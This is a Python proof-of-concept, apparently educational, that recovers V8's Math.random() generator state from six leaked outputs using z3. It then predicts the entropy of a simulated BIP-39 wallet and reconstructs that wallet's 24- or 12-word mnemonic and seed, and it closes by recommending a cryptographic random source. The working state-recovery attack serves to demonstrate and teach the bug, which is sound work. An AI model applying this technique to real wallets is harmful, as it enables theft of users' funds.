#!/usr/bin/env python3
"""
PoC: why Math.random() must NEVER generate wallet credentials.

Scenario (BIP-39)
-----------------
A crypto wallet "generates" a mnemonic seed phrase. BIP-39 says the
mnemonic encodes 128..256 bits of ENTROPY plus a checksum, and is stretched
into a 512-bit BIP-39 seed (PBKDF2-HMAC-SHA512, 2048 rounds) that controls
all funds.

Our "wallet" builds that entropy from Math.random() -- a depressingly
common real-world bug (unaudited JS wallets, browser extensions, phishing
pages, tutorials). It even uses the 24-word / 256-bit variant and produces
a proper 512-bit seed, so it *looks* maximally secure.

The attack
----------
Nothing about the wallet's crypto is broken: SHA-256 checksum, PBKDF2,
wordlist -- all textbook. What is broken is the entropy source. Any other
Math.random() call in the same JS context (a session token, an analytics
beacon, a log line, an error report) leaks 53 bits of the generator's
internal state. In this demo the attacker observes just SIX unrelated
Math.random() outputs (calls #1..#6 -- e.g. from a page tracker), and the
wallet then draws its "256-bit" entropy from calls #7..#38 of the SAME
stream. The attacker:

    1. recovers V8's 128-bit xorshift128+ state from the 6 leaks (z3, ~ms),
    2. predicts the entropy bytes the wallet has not drawn yet,
    3. rebuilds the 24-word mnemonic,
    4. derives the 512-bit BIP-39 seed (PBKDF2-HMAC-SHA512, 2048 rounds),
    5. owns the wallet.

Entropy accounting (the actual point)
-------------------------------------
    mnemonic length        12 words   24 words
    advertised entropy     128 bits   256 bits
    derived BIP-39 seed    512 bits   512 bits
    brute-force space      2**128     2**256
    ------------------------------------------------
    REAL entropy           2**64      2**64     <- one 64-bit V8 seed
    after 2+ leaked calls  ~0 bits    ~0 bits   <- state uniquely determined

Stretching the mnemonic to 24 words and running PBKDF2 for 2048 rounds
mixes the bits, but cannot create entropy that was never there. The
derived 512-bit seed has exactly the entropy of the Math.random() stream
it came from: 64 bits, and ~0 against anyone who observed a few outputs.

Run:  uv run python bip39_poc.py
Requires: node on PATH (same machine), bip39_english.txt (auto-downloaded
and SHA-256-verified from bitcoin/bips on first run).
"""

from __future__ import annotations

import hashlib
import json
import shutil
import subprocess
import time
import urllib.request
from pathlib import Path

from z3 import BitVec  # noqa: F401  (poc.py pulls the rest itself)

# Reuse the verified V8 model + attack from poc.py (same directory).
from poc import SHIFT, as_double, backward_step, call_word, extend_stream, \
    solve_low_bits

WORDLIST_URL = ("https://raw.githubusercontent.com/bitcoin/bips/"
                "master/bip-0039/english.txt")
WORDLIST_SHA256 = "2f5eed53a4727b4bf8880d8f3f199efc90e58503646d9ff8eff3a2ed3b24dbda"
WORDLIST_PATH = Path(__file__).resolve().parent / "bip39_english.txt"

LEAK_CALLS = 6          # side-channel outputs the attacker observes
PBKDF2_ROUNDS = 2048    # BIP-39 seed stretching
PASSPHRASE = ""         # BIP-39 optional passphrase, "mnemonic" + passphrase


# --------------------------------------------------------------------------
# BIP-39 (wordlist, mnemonic construction, 512-bit seed derivation)
# --------------------------------------------------------------------------

def ensure_wordlist() -> list[str]:
    """Fetch + SHA-256-verify the canonical BIP-39 English wordlist."""
    if not WORDLIST_PATH.exists():
        print(f"downloading BIP-39 wordlist from {WORDLIST_URL} ...")
        urllib.request.urlretrieve(WORDLIST_URL, WORDLIST_PATH)
    digest = hashlib.sha256(WORDLIST_PATH.read_bytes()).hexdigest()
    if digest != WORDLIST_SHA256:
        WORDLIST_PATH.unlink(missing_ok=True)
        raise RuntimeError(f"wordlist SHA-256 mismatch ({digest})")
    words = WORDLIST_PATH.read_text().splitlines()
    assert len(words) == 2048
    return words


def mnemonic_from_entropy(entropy: bytes, words: list[str]) -> str:
    """Entropy -> checksum (first ENT/32 bits of SHA-256) -> 11-bit indices
    -> words. Exactly BIP-39."""
    checksum_bits = len(entropy) * 8 // 32
    bits = "".join(f"{b:08b}" for b in entropy)
    h = hashlib.sha256(entropy).digest()
    bits += "".join(f"{b:08b}" for b in h)[:checksum_bits]
    return " ".join(words[int(bits[i:i + 11], 2)]
                    for i in range(0, len(bits), 11))


def bip39_seed(mnemonic: str, passphrase: str = PASSPHRASE) -> bytes:
    """BIP-39 seed: PBKDF2-HMAC-SHA512(mnemonic, 'mnemonic'+passphrase,
    2048 rounds) -> 512 bits."""
    return hashlib.pbkdf2_hmac("sha512", mnemonic.encode("utf-8"),
                               ("mnemonic" + passphrase).encode("utf-8"),
                               PBKDF2_ROUNDS, dklen=64)


def self_test(words: list[str]) -> None:
    """Check the BIP-39 implementation against official (trezor) vectors."""
    vector1 = ("00000000000000000000000000000000",
               "abandon abandon abandon abandon abandon abandon abandon "
               "abandon abandon abandon abandon about",
               "c55257c360c07c72029aebc1b53c05ed0362ada38ead3e3e9efa3708e534"
               "95531f09a6987599d18264c1e1c92f2cf141630c7a3c4ab7c81b2f001698"
               "e7463b04")
    vector2 = ("7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f",
               "legal winner thank year wave sausage worth useful legal "
               "winner thank yellow",
               "2e8905819b8723fe2c1d161860e5ee1830318dbf49a83bd451cfb8440c28"
               "bd6fa457fe1296106559a3c80937a1c1069be3a3a5bd381ee6260e8d973"
               "9fce1f607")
    for entropy_hex, mnemonic, seed_hex in (vector1, vector2):
        e = bytes.fromhex(entropy_hex)
        assert mnemonic_from_entropy(e, words) == mnemonic, "mnemonic vector"
        assert bip39_seed(mnemonic, "TREZOR").hex() == seed_hex, "seed vector"


# --------------------------------------------------------------------------
# The "victim wallet": node process using Math.random() for entropy
# --------------------------------------------------------------------------

def victim_wallet_js(n_bytes: int) -> str:
    """node script: leak a few unrelated Math.random() outputs, then build
    BIP-39 entropy from floor(Math.random()*256) calls in the same stream."""
    return f"""
const fs = require('fs');
const crypto = require('crypto');
const words = fs.readFileSync({str(WORDLIST_PATH)!r}, 'utf8')
  .split('\\n').filter(w => w.length > 0);

// --- attacker-visible side channel: 6 unrelated Math.random() consumers ---
const leak = [];
for (let i = 0; i < {LEAK_CALLS}; i++)
  leak.push(String(Math.random() * 9007199254740992));

// --- the wallet draws its entropy from the SAME Math.random() stream ---
const bytes = [];
for (let i = 0; i < {n_bytes}; i++) bytes.push(Math.floor(Math.random() * 256));
const ent = Buffer.from(bytes);

// --- textbook BIP-39: checksum + words + 512-bit seed ---
const csBits = {n_bytes} * 8 / 32;
const h = crypto.createHash('sha256').update(ent).digest();
let bits = '';
for (const b of ent) bits += b.toString(2).padStart(8, '0');
for (let i = 0; i < csBits; i++) bits += ((h[i >> 3] >> (7 - (i & 7))) & 1);
const mnemonic = [];
for (let i = 0; i < bits.length / 11; i++)
  mnemonic.push(words[parseInt(bits.slice(i * 11, (i + 1) * 11), 2)]);
const seed = crypto.pbkdf2Sync(mnemonic.join(' '), 'mnemonic',
                               {PBKDF2_ROUNDS}, 64, 'sha512').toString('hex');

console.log(JSON.stringify({{
  leak, entropy: ent.toString('hex'),
  mnemonic: mnemonic.join(' '), seed
}}));
"""


def run_victim(n_bytes: int) -> dict:
    out = subprocess.check_output(["node", "-e", victim_wallet_js(n_bytes)],
                                  text=True)
    return json.loads(out)


# --------------------------------------------------------------------------
# The attacker: leaks only -> mnemonic + 512-bit seed
# --------------------------------------------------------------------------

def attack(n_bytes: int, words: list[str]) -> bool:
    n_words_mn = n_bytes * 3 // 4          # 12 or 24
    adv_bits = n_bytes * 8                 # 128 or 256 advertised

    print("=" * 72)
    print(f"ATTACK -- {n_words_mn}-word BIP-39 wallet ('{adv_bits}-bit' entropy)"
          f" seeded by Math.random()")
    print("=" * 72)

    wallet = run_victim(n_bytes)
    leak = [int(x) for x in wallet["leak"]]

    print(f"\n[wallet ] fresh context; generated a {n_words_mn}-word mnemonic"
          f" from {adv_bits} bits of Math.random() entropy")
    print(f"[attacker] sees only {LEAK_CALLS} UNRELATED Math.random() outputs"
          f" from the same context:")
    for i, m in enumerate(leak):
        print(f"  leak #{i + 1} = {as_double(m)!r}"
              f"   (e.g. a session token / analytics RNG call)")

    # 1. recover the generator state (same attack as poc.py, part 1)
    t0 = time.time()
    full = solve_low_bits(leak, reversed_order=True)
    dt = (time.time() - t0) * 1000
    if full is None:
        print("z3 found no consistent state -- aborting.")
        return False
    xs = {call_word(i + 1): full[i] for i in range(len(full))}
    for j in range(max(xs) - 1, 1, -1):
        xs[j - 1] = backward_step(xs[j], xs[j + 1])
    highest = call_word(LEAK_CALLS + n_bytes)
    extend_stream(xs, highest)
    print(f"\n[attacker] z3 recovered the full 128-bit state in {dt:.1f} ms"
          f" from {LEAK_CALLS} leaks")

    # 2. predict the entropy bytes: node computed floor(d * 256) where
    #    d = mantissa / 2**53, so byte = mantissa >> (53 - 8) = mantissa >> 45.
    pred_bytes = bytes(((xs[call_word(LEAK_CALLS + 1 + i)] >> SHIFT) >> 45)
                       for i in range(n_bytes))
    print(f"[attacker] predicted all {n_bytes} entropy bytes the wallet was"
          " about to draw")

    # 3.+4. rebuild mnemonic and derive the 512-bit BIP-39 seed
    pred_mnemonic = mnemonic_from_entropy(pred_bytes, words)
    pred_seed = bip39_seed(pred_mnemonic)

    print(f"\n[wallet ] mnemonic (secret): {wallet['mnemonic']}")
    print(f"[attacker] mnemonic (recon): {pred_mnemonic}")
    print(f"[wallet ] 512-bit BIP-39 seed: {wallet['seed']}")
    print(f"[attacker] 512-bit BIP-39 seed: {pred_seed.hex()}")

    got_mn = pred_mnemonic == wallet["mnemonic"]
    got_seed = pred_seed.hex() == wallet["seed"]
    entropy_leak = pred_bytes.hex() == wallet["entropy"]
    print(f"\n  entropy bytes match : {entropy_leak}")
    print(f"  mnemonic matches    : {got_mn}")
    print(f"  512-bit seed matches: {got_seed}")

    print(f"""
  entropy accounting for this wallet:
    advertised  {adv_bits:>3} bits (brute force: 2^{adv_bits} mnemonics)
    derived seed 512 bits (PBKDF2, {PBKDF2_ROUNDS} rounds -- mixes, cannot add entropy)
    real        64 bits   (one V8 xorshift128+ seed)
    vs attacker ~0 bits    ({LEAK_CALLS} leaked doubles -> state pinned, wallet for free)
""")
    return got_mn and got_seed and entropy_leak


# --------------------------------------------------------------------------

def main() -> int:
    words = ensure_wordlist()
    print("BIP-39 English wordlist: 2048 words, SHA-256 verified")
    self_test(words)
    print("BIP-39 implementation: 2/2 official (trezor) test vectors pass\n")

    results = []
    # 24 words / 256-bit entropy = BIP-39's maximum "security";
    # 12 words / 128-bit = the common default.
    results.append(("24-word mnemonic (256-bit)", attack(32, words)))
    results.append(("12-word mnemonic (128-bit)", attack(16, words)))

    print("=" * 72)
    print("CONCLUSION")
    print("=" * 72)
    print(f"""
The wallet did nothing 'wrong' by BIP-39's book: correct checksum,
correct wordlist, 512-bit PBKDF2 seed. But BIP-39's entropy guarantee
only holds if the entropy is truly random. Math.random() provides at
most 64 bits -- and once ANY {LEAK_CALLS}+ of its outputs are observable
anywhere in the context, 0 bits. PBKDF2's 2048 rounds cost the victim
and the attacker alike almost nothing here, because the attacker never
brute-forces anything: they recompute the seed directly.

Use crypto.getRandomValues() (CSPRNG, 256-bit-seeded, one-way state
update) for anything that guards money.
""")
    print("Summary:")
    for name, ok in results:
        print(f"  [{'PASS' if ok else 'FAIL'}] {name}")
    return 0 if all(ok for _, ok in results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
